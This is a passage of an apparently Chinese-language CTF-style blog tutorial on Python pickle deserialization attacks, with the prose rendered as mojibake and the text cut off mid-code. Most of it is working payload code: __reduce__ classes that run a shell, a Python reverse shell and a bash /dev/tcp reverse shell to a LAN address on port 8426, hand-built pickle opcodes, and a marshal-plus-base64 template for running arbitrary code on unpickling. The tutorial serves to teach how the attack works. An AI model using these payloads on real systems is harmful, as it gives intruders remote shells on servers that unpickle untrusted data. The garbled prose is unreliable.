&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809002248690.png" alt="image-20210809002248690">&lt;/p>
&lt;p>ä¸Šé¢æ‰‹å†™çš„opcodeæˆåŠŸè¿”å›žäº†shçš„shellï¼›è€Œé€šè¿‡dumpså’Œloadså®žçŽ°åˆ™æ˜¯è¿™æ ·ï¼›æˆ‘ä»¬æ‰§è¡Œçš„ä»£ç éƒ½åœ¨&lt;code>__reduce__&lt;/code>ä¸­&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">test&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">test&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">test&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809011024984.png" alt="image-20210809011024984">&lt;/p>
&lt;p>ä¹Ÿé¡ºåˆ©è¿”å›žäº†shellï¼Œå¾ˆå®¹æ˜“å‘çŽ°è·Ÿä¸Šé¢æ‰‹å†™çš„opcodeå¹¶æ— å·®å¼‚ï¼Œè€Œè¿™ä¸ªæ ¸å¿ƒå°±æ˜¯æž„é€ æ—¶çš„&lt;code>__reduce__&lt;/code>å‡½æ•°çš„è¿”å›žå€¼ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥rceï¼Œåå¼¹shellä¹‹ç±»çš„ã€‚&lt;/p>
&lt;h3 id="å¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­">å¦ä¸€ä¸ªåå¼¹shellçš„å°æ —å­&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">A&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;python2 -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;192.168.31.29&amp;#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">A&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># æˆ–è€…æœ€ç®€å•çš„æ‰‹å†™opcode ä¸ç”¨ç‰¹æ„æž„é€ class A()&lt;/span>
&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809090941558.png" alt="image-20210809090941558">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%E5%8F%8D%E5%BC%B9shell%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/">Linuxåå¼¹shellï¼ˆä¸€ï¼‰æ–‡ä»¶æè¿°ç¬¦ä¸Žé‡å®šå‘&lt;/a> | &lt;a href="https://www.k0rz3n.com/2018/08/05/Linux%20%E5%8F%8D%E5%BC%B9shell%20%EF%BC%88%E4%BA%8C%EF%BC%89%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E6%9C%AC%E8%B4%A8/">Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨&lt;/a>&lt;/p>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­1 - [DasCTF 0721] easyweb
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/#easyweb">ä¹‹å‰å†™è¿‡äº†&lt;/a>ï¼Œåœ¨å¯¹sessionçš„å¤„ç†æ—¶ä½¿ç”¨äº†pickleï¼Œæˆ‘ä»¬å¯ä»¥æž„é€ æ¶æ„çš„sessionåå¼¹shellï¼›ä¹Ÿæ²¡æœ‰ç‰¹æ®Šçš„è¿‡æ»¤å’Œé™åˆ¶ï¼Œpayloadæ€Žä¹ˆå†™éƒ½è¡Œ&lt;/p>
&lt;/details>
&lt;h3 id="ç”¨marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡">ç”¨Marshalåºåˆ—åŒ–ä»»æ„ä»£ç å¯¹è±¡&lt;/h3>
&lt;p>å¦‚æžœåªåœ¨&lt;code>__reduce__&lt;/code>ä¸­ç”¨&lt;code>-c&lt;/code>å‚æ•°æ‰§è¡Œä»£ç çš„è¯ï¼Œé‡åˆ°ä¸€äº›è‡ªå®šå‡½æ•° åœ¨æ ¼å¼ä¸Šå°±ä¼šæ¯”è¾ƒéº»çƒ¦&lt;/p>
&lt;p>å‰é¢æåˆ°pickleä¸èƒ½åºåˆ—åŒ–ä»£ç å¯¹è±¡ï¼Œæ¥ä¸ªå®žä¾‹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10)=&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094914448.png" alt="image-20210809094914448">&lt;/p>
&lt;p>ä½†ä¹Ÿä¸æ˜¯ç»è·¯ä¸€æ¡ï¼Œ&lt;strong>Marshal&lt;/strong>å¯ä»¥è®©è¿™æ®µä»£ç åºåˆ—åŒ–&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#39;fib(10) =&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">fib&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code_serialized&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">code_serialized&lt;/span>
&lt;span style="color:#75715e"># YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çŽ°åœ¨å¾—åˆ°äº†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒè¢«ååºåˆ—åŒ–æ—¶æ‰§è¡Œï¼Œä½†æ˜¯ç›´æŽ¥å°†ä»–æ”¾å…¥&lt;code>__reduce__&lt;/code>è¿”å›žéƒ¨åˆ†ä¼¼ä¹Žå¹¶ä¸å¯ä»¥ï¼Œ&lt;code>__reduce__&lt;/code>æ˜¯è°ƒç”¨callableæ¥æ‰§è¡Œå‚æ•°ä¹‹ç±»çš„ï¼Œè€Œæˆ‘ä»¬æž„é€ å¥½çš„æœ¬èº«å°±æ˜¯callableï¼Œå¸Œæœ›å®ƒæ‰§è¡Œè€Œä¸æ˜¯ä½œä¸ºå¦ä¸€ä¸ªcallableçš„å‚æ•°ï¼›è¿™æ—¶å°±éœ€è¦ç›´æŽ¥ä»ŽPVMæ“ä½œç çš„å±‚çº§è¿›è¡Œæž„é€ äº†ã€‚&lt;/p>
&lt;p>â€”â€”â€”â€”å…¶å®žæˆ‘è§‰å¾—æ›´é€šä¿—çš„ç†è§£æ˜¯è¿™æ ·å¯ä»¥ä¸æŠŠè¦æ‰§è¡Œçš„ä»£ç é™åˆ¶åœ¨&lt;code>return (os.system,(a,))&lt;/code>è¿™æ ·å¼çš„æ¡†æž¶ä¸­ï¼Œè€Œæ˜¯å¯ä»¥è‡ªç”±çš„æ‰§è¡Œä»£ç ï¼Œæˆ–è€…è¯´å°±æ˜¯å¦ä¸€ç§å½¢å¼çš„pker&lt;/p>
&lt;p>æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å…¶å®žæ˜¯ï¼ˆåˆ©ç”¨åˆ°python oopçš„ç‰¹æ€§ï¼Œé€šè¿‡&lt;code>types.FunctionTyle(func_code,globals(),â€™â€™)()&lt;/code>æ¥åŠ¨æ€åœ°åˆ›å»ºåŒ¿åå‡½æ•°ï¼Œå‚è§ï¼š&lt;a href="https://docs.python.org/zh-cn/3/library/types.html#module-types">å®˜æ–¹æ–‡æ¡£&lt;/a>ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">))()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ›´å¯è¯»ä¸€äº›&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">code_str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_enc&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code_str&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">types&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">FunctionType&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">code&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">(),&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">func&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŽ¥ä¸‹æ¥å°±æ˜¯æ‰‹åŠ¨æž„é€ opcodeçš„æ—¶å€™äº†ï¼Œå›žæƒ³ä¹‹å‰è¿”å›žä¸€ä¸ªç®€å•çš„shellæ—¶çš„opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;/bin/sh&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¼€å¤´çš„cåŽé¢è·Ÿçš„æ˜¯å¼•å…¥çš„æ¨¡å—ï¼Œæ¢è¡Œä¹‹åŽæ˜¯å‡½æ•°ï¼Œå†æ¢è¡Œä¹‹åŽæ˜¯æ‰§è¡Œçš„è¯­å¥ï¼›æ ¹æ®è¿™ä¸ªç»“æž„æŠŠmarshalå’Œb64åŠ è¿›åŽ»&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è€Œglobals()å¯ä»¥åœ¨&lt;code>__builtin__&lt;/code>æ¨¡å—ä¸­å¼•å…¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">{}{}&lt;/span>
&lt;span style="color:#111">c__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æŠŠä¸Šé¢çš„ç¼åˆèµ·æ¥å¾—åˆ°æœ€ç»ˆçš„payloadï¼Œæ³¨æ„æ·»åŠ &lt;code>(rR.&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">ctypes&lt;/span>
&lt;span style="color:#111">FunctionType&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmarshal&lt;/span>
&lt;span style="color:#111">loads&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbase64&lt;/span>
&lt;span style="color:#111">b64decode&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;YwAAAAAB........&amp;#39;&lt;/span>
&lt;span style="color:#111">tRtRc__builtin__&lt;/span>
&lt;span style="color:#111">globals&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tRS&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">tR&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æž„é€ è¿™ä¸ªäººçœ‹ç€è´¹åŠ²çš„payloadçš„æ¨¡æ¿~ï¼ˆæ¥æºå‚è§ï¼š&lt;a href="https://checkoway.net/musings/pickle/">Arbitrary code execution with Python pickles&lt;/a>ï¼‰&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># py2&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span> &lt;span style="color:#75715e"># Your code here&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
&lt;/span>&lt;span style="color:#d88200">(cmarshal
&lt;/span>&lt;span style="color:#d88200">loads
&lt;/span>&lt;span style="color:#d88200">(cbase64
&lt;/span>&lt;span style="color:#d88200">b64decode
&lt;/span>&lt;span style="color:#d88200">(S&amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tRtRc__builtin__
&lt;/span>&lt;span style="color:#d88200">globals
&lt;/span>&lt;span style="color:#d88200">(tRS&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#d88200">tR(tR.&amp;#34;&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">marshal&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">foo&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">func_code&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç”¨pickleæ‰§è¡Œä¸€ä¸‹é‚£ä¸²payloadçœ‹çœ‹æ•ˆæžœ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210809094819276.png" alt="image-20210809094819276">&lt;/p>
&lt;p>æˆåŠŸè¿”å›žäº†æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç»“æžœå’Œä¸€ä¸ªshell&lt;/p>
&lt;p>åŽŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿå¯ä»¥ç”¨Marshal+b64çš„æ–¹å¼åå¼¹shellï¼ˆç”¨æ¨¡æ¿ç”Ÿæˆopcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">marshal&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">foo&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#111">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># print &amp;#39;hold on...&amp;#39;&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">a&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;ctypes
&lt;/span>&lt;span style="color:#d88200">FunctionType
